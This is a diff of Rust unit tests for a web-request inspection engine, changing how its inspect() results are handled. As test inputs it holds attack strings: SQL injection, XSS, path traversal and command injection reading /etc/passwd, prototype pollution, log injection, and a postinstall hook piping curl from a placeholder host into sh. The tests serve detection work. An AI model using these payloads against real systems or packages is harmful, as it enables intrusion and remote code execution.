@@ -54,8 +54,7 @@ fn detects_sql_injection() {
     let matches = inspect(&RequestParts {
         query: "q=' OR 1=1--",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
 }
@@ -65,8 +64,7 @@ fn detects_percent_encoded_sql_injection() {
     let matches = inspect(&RequestParts {
         query: "id=1'%20OR%201=1",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
 }
@@ -76,8 +74,7 @@ fn treats_plus_as_space_in_query_strings() {
     let matches = inspect(&RequestParts {
         query: "id=1'+OR+1=1",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-SQLI-001");
 }
@@ -87,8 +84,7 @@ fn detects_xss() {
     let matches = inspect(&RequestParts {
         query: "text=<script>alert(1)</script>",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-XSS-001");
 }
@@ -98,8 +94,7 @@ fn detects_path_traversal() {
     let matches = inspect(&RequestParts {
         path: "/download/../../../../etc/passwd",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-PATH-001");
 }
@@ -109,8 +104,7 @@ fn detects_path_traversal_in_query_string() {
     let matches = inspect(&RequestParts {
         query: "file=../../../../etc/passwd",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-PATH-002");
     assert_eq!(matches[0].matched_target, RuleTarget::Query);
@@ -121,8 +115,7 @@ fn detects_command_injection() {
     let matches = inspect(&RequestParts {
         query: "cmd=whoami; cat /etc/passwd",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-CMD-001");
 }
@@ -132,8 +125,7 @@ fn detects_supply_chain_install_script_payload() {
     let matches = inspect(&RequestParts {
         body: r#"{"scripts":{"postinstall":"curl https://example.invalid/i.sh | sh"}}"#,
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-SC-001");
     assert_eq!(
@@ -147,8 +139,7 @@ fn detects_insecure_forwarded_protocol() {
     let matches = inspect(&RequestParts {
         headers: "x-forwarded-proto: http",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-CRYPTO-001");
 }
@@ -158,8 +149,7 @@ fn detects_method_override_design_risk() {
     let matches = inspect(&RequestParts {
         headers: "x-http-method-override: delete",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-DESIGN-001");
 }
@@ -169,8 +159,7 @@ fn detects_auth_secret_in_url() {
     let matches = inspect(&RequestParts {
         query: "password=secret",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-AUTH-002");
 }
@@ -180,8 +169,7 @@ fn detects_integrity_failure_payloads() {
     let matches = inspect(&RequestParts {
         body: r#"{"__proto__":{"admin":true}}"#,
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-INTEGRITY-001");
 }
@@ -191,8 +179,7 @@ fn detects_log_injection_payloads() {
     let matches = inspect(&RequestParts {
         query: "name=alice%0aERROR status=500",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-LOG-001");
 }
@@ -202,8 +189,7 @@ fn detects_exceptional_condition_payloads() {
     let matches = inspect(&RequestParts {
         query: "file=%00",
         ..RequestParts::default()
-    })
-    .unwrap();
+    });
 
     assert_eq!(matches[0].rule_id, "SAUGRA-EXC-001");
 }
